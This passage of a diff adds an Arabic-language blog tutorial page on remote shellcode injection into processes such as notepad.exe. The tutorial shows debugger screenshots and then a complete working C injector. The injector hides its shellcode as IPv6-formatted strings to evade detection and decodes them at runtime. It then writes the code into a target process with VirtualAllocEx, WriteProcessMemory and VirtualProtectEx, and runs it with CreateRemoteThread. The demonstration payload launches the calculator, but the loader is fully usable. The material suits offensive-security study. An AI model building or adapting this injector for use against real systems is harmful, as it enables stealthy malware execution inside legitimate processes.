+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">بعد كده هنضغط Enter عشان يعمل Deobfuscation ، وكمان يحجز مكان فـ
+                        الميموري ويطلع الـ Address :</li>
+                    هنضغط <code style="background: gold; font-size: 14px;">Ctrl + G</code> ونضيف الـ Address هنا :
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-7.png" alt="RemoteShellcodeInj-7" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هقف ع المكان اللـ روحتله ، <code
+                            style="background: gold; font-size: 14px;">Right-Click > Follow in Dump > Selected
+                        Address</code> :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-8.png" alt="RemoteShellcodeInj-8" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هتلاقي إن ده المكان اللـ حجزناه فـ الميموري .. وحاليا فاضي :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-9.png" alt="RemoteShellcodeInj-9" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هتضغط Enter .. هتلاقي إن الشيل كود اتنقل للمكان اللـ حجزناه بالفعل :
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-10.png" alt="RemoteShellcodeInj-10"
+                            class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">آخر حاجه .. هترن وهتلاقي الـ <code
+                            style="background: gold; font-size: 14px;">Calculator</code> فتحت من الـ <code
+                            style="background: gold; font-size: 14px;">notepad.exe</code> بنجاح
+                        :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-11.png" alt="RemoteShellcodeInj-11"
+                            class="article-image" loading="lazy">
+                    </div>
+                </ol>
+
+
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h><br>
+                        #include &lt;stdio.h><br>
+                        #include &lt;TlHelp32.h><br><br>
+                        
+                        char* Ipv6Array[] = {<br>
+                            &nbsp;&nbsp;"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",<br>
+                            &nbsp;&nbsp;"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",<br>
+                            &nbsp;&nbsp;"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",<br>
+                            &nbsp;&nbsp;"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",<br>
+                            &nbsp;&nbsp;"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",<br>
+                            &nbsp;&nbsp;"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:9090:9090:9090:9090:9090:9090"<br>
+                        };<br><br>
+                        
+                        #define NumberOfElements 18<br><br>
+                        
+                        typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(<br>
+                        &nbsp;&nbsp;PCSTR                   S,<br>
+                        &nbsp;&nbsp;PCSTR* Terminator,<br>
+                        &nbsp;&nbsp;PVOID                   Addr<br>
+                            );<br><br>
+                        
+                        
+                        BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br><br>
+                        
+                            &nbsp;&nbsp;PBYTE           pBuffer = NULL,<br>
+                            &nbsp;&nbsp;TmpBuffer = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;SIZE_T          sBuffSize = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;PCSTR           Terminator = NULL;<br><br>
+                            
+                            &nbsp;&nbsp;NTSTATUS        STATUS = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;// getting RtlIpv6StringToAddressA  address from ntdll.dll<br>
+                            &nbsp;&nbsp;fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");<br>
+                            &nbsp;&nbsp;if (pRtlIpv6StringToAddressA == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                                &nbsp;&nbsp;// getting the real size of the shellcode (number of elements * 16 => original shellcode size)<br>
+                                &nbsp;&nbsp;sBuffSize = NmbrOfElements * 16;<br>
+                                &nbsp;&nbsp;// allocating mem, that will hold the deobfuscated shellcode<br>
+                                &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
+                                &nbsp;&nbsp;if (pBuffer == NULL) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;// setting TmpBuffer to be equal to pBuffer<br>
+                                    &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
+                        
+                        
+                                    &nbsp;&nbsp;// loop through all the addresses saved in Ipv6Array<br>
+                            &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;// Ipv6Array[i] is a single ipv6 address from the array Ipv6Array<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if failed ...<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;&nbsp;&nbsp;// tmp buffer will be used to point to where to write next (in the newly allocated memory)<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer = (PBYTE)(TmpBuffer + 16);<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
+                                    &nbsp;&nbsp;*pDSize = sBuffSize;<br>
+                                    &nbsp;&nbsp;return TRUE;<br>
+                        }<br><br>
+                        
+                        BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess)<br>
+                        {<br>
+                            &nbsp;&nbsp;HANDLE hSnapshot = NULL;<br>
+                            &nbsp;&nbsp;PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };<br><br>
+                        
+                            &nbsp;&nbsp;hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);<br>
+                            &nbsp;&nbsp;if (hSnapshot == INVALID_HANDLE_VALUE) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateToolhelp32Snapshot Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;goto _EndOfFunction;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;if (!Process32First(hSnapshot, &Proc)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Process32First Failed with Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;goto _EndOfFunction;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;do {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;WCHAR LowerName[MAX_PATH * 2];<br><br>
+                        
+                                        &nbsp;&nbsp;&nbsp;&nbsp;if (Proc.szExeFile) {<br><br>
+                        
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwSize = lstrlenW(Proc.szExeFile);<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD i = 0;<br><br>
+                        
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlSecureZeroMemory(LowerName, MAX_PATH * 2);<br><br>
+                        
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (dwSize < MAX_PATH * 2) {<br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (; i < dwSize; i++) {<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i++] = '\0';<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                                    &nbsp;&nbsp;}<br><br>
+                        
+                                                    &nbsp;&nbsp;if (wcscmp(LowerName, szProcessName) == 0) {<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;*dwProcessId = Proc.th32ProcessID;<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;if (*hProcess == NULL)<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;break;<br>
+                                                        &nbsp;&nbsp;}<br><br>
+                        
+                            } while (Process32Next(hSnapshot, &Proc));<br><br>
+                        
+                        
+                        
+                        _EndOfFunction:<br>
+                        &nbsp;&nbsp;if (hSnapshot != NULL)<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hSnapshot);<br>
+                                &nbsp;&nbsp;if (*dwProcessId == NULL || *hProcess == NULL)<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;return TRUE;<br><br>
+                        
+                        }<br><br>
+                        
+                        BOOL ShellcodeInjectionToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {<br>
+                            &nbsp;&nbsp;PVOID pShellcodeAddress      = NULL;<br>
+                            &nbsp;&nbsp;SIZE_T sNumberOfBytesWritten = NULL;<br>
+                            &nbsp;&nbsp;DWORD dwOldProtection        = NULL;<br><br>
+                        
+                        
+                            &nbsp;&nbsp;pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                            &nbsp;&nbsp;if (pShellcodeAddress == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAllocEx Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+
+                                &nbsp;&nbsp;printf("[i] Allocated Memory at : 0x%p \n", pShellcodeAddress);<br>
+                                &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to write Shellcode ... \n");<br>
+                                    &nbsp;&nbsp;getchar();<br>
+                        
+                                &nbsp;&nbsp;if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] WriteProcessMemory Failed with Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+
+                                    printf("[i] Successfully Written %d Bytes \n", sNumberOfBytesWritten);<br><br>
+                        
+                                    &nbsp;&nbsp;memset(pShellcode, '\0', sSizeOfShellcode);<br><br>
+                        
+                                    &nbsp;&nbsp;if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtectEx Failed with Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                                        
+                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Run ... ");<br>
+                                        &nbsp;&nbsp;getchar();<br>
+
+                                        &nbsp;&nbsp;if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateRemoteThread Failed with Error : %d \n", GetLastError());<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                            &nbsp;&nbsp;}<br><br>
+                        
+                                            &nbsp;&nbsp;return TRUE;<br><br>
+                        
+                                            &nbsp;&nbsp;}<br><br>
+                        
+                        int wmain(int argc, wchar_t* argv[]) {<br>
+                            &nbsp;&nbsp;HANDLE hProcess = NULL;<br>
+                            &nbsp;&nbsp;DWORD dwProcessId = NULL;<br>
+                            &nbsp;&nbsp;PBYTE pDeobfuscatedPayload = NULL;<br>
+                            &nbsp;&nbsp;SIZE_T sDeobfuscatedSize = NULL;<br><br><br>
+                        
+                            &nbsp;&nbsp;if (argc < 2) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;wprintf(L"[i] Usage : \"%s\" &lt;Process Name> \n", argv[0]);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;wprintf(L"[i] Searching For Process ID of \"%s\" ... ", argv[1]);<br>
+                                &nbsp;&nbsp;if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Process not found.\n");<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;printf("[i] DONE \n");<br>
+                                    &nbsp;&nbsp;printf("[i] Found Target Process PID : %d \n", dwProcessId);<br><br>
+                        
+                                    &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to Convert ... \n");<br>
+                                    &nbsp;&nbsp;getchar();<br>
+                        
+                                    &nbsp;&nbsp;if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Ipv6Deobfuscation failed.\n");<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;goto _Cleanup;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                                        &nbsp;&nbsp;printf("[i] DONE \n");<br>
+                                        &nbsp;&nbsp;printf("[i] Deobfuscated Payload at : 0x%p of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);<br><br>
+                        
+                                        &nbsp;&nbsp;if (!ShellcodeInjectionToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Shellcode Injection failed.\n");<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;goto _Cleanup;<br>
+                                            &nbsp;&nbsp;}<br><br>
+                        
+                                            &nbsp;&nbsp;printf("[i] Injection Successful.\n");<br><br>
+                        
+                        _Cleanup:<br>
+                        &nbsp;&nbsp;if (pDeobfuscatedPayload) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br>
+                            &nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;if (hProcess) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hProcess);<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to Quit ...");<br>
+                                &nbsp;&nbsp;getchar();<br>
+                                &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                        
+                </code></div>
+                <p style="border-top: 2px solid #FFD700;"></p>
+                <p style="border-top: 2px solid #FFD700;"></p>
+                <p>وبكدا . أتمني تكون استفدت حاجه .. ونلتقي فـ مقالة قادمة .. ولو عندك أي تعليق ، استفسار ، أي حاجه ..
+                    متترددش وكلمني.</p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
+                <h2>References</h2>
+                <p>خدلك لفة فـ المصادر والمراجع يا عزيزي:</p>
+
+                <ul style="direction: ltr;">
+                    <li><a href="https://medium.com/@laithsalman2522003/injecting-shellcode-into-running-processes-2f106a53f918"
+                            target="_blank" class="download-link" s>Injecting shellcode into running processes</a>
+                    </li>
+                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection"
+                            target="_blank" class="download-link">CreateRemoteThread Shellcode Injection</a></li>
+
+                    <li><a href="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/" target="_blank"
+                            class="download-link">Shellcode Injection in C# - Part 1 - Process Injection</a></li>
+
+                </ul>
+            </div>
+            <div class="nav-buttons">
+                <a href="#" onclick="nextArticle()" style="direction: ltr;">Next →</a>
+                <a href="./DLL-Injection.html" onclick="previousArticle()" style="direction: ltr;">← Previous</a>
+            </div>
+    </section>
+    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
+        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
+    </footer>
+
+    <script src="../src/JS/script.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
+    <script>
+        window.onload = function () {
+            AOS.init({ offset: 0 });
+        };
+    </script>
+    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+
+</html>
